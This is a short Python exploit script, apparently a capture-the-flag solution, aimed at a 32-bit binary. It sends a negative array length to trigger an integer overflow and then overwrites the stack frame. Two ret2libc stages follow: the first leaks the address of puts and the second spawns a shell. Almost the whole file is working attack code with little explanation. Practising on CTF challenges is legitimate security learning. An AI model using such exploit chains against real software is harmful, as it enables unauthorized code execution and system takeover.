from helper import *
abbre(globals(), io, loader) # 此处定义了常用的缩写
from helper.exp import ret2libc_A, ret2libc_B
import re
import ctypes
from LibcSearcher import *


# fill array and ebp
def fill_array(content):
    ru(b"choice:\n")
    sl(b"1")
    sl(content)

def from_main():
    # 0x44 + 4 + ret
    ru(b"length of array:")
    sl(b"-2147483648")   # -2^31 -> 

    for i in range(10):
        fill_array(bytes(str(0x1111), encoding="utf-8"))

    fill_array(bytes(str(0x1ead), encoding="utf-8"))
    fill_array(bytes(str(0x1ead), encoding="utf-8"))
    fill_array(bytes(str(0xc), encoding="utf-8"))
    for i in range(5):
        fill_array(bytes(str(0x2222), encoding="utf-8"))


from_main()
payload = ret2libc_A("puts", elf.sym['main'], b"")

for bytes32 in re.findall(b"....", payload):
    sl(b"1"); sl(str(u32(bytes32)))

sl(b"4")
leaked = leak()
info(hex(leaked))

# libcs = LibcSearcher("puts", leaked)
# libcs.select_libc()

# TODO 添加对LibcSearcher的支持
# https://github.com/dev2ero/LibcSearcher
from_main()
payload = ret2libc_B('puts', leaked, elf.libc, b"")
# pause()
for bytes32 in re.findall(b"....", payload):
    sl(b"1")
    num = u32(bytes32) 
    num = ctypes.c_int32(num).value
    sl(str(num))
sl(b'4')
shell()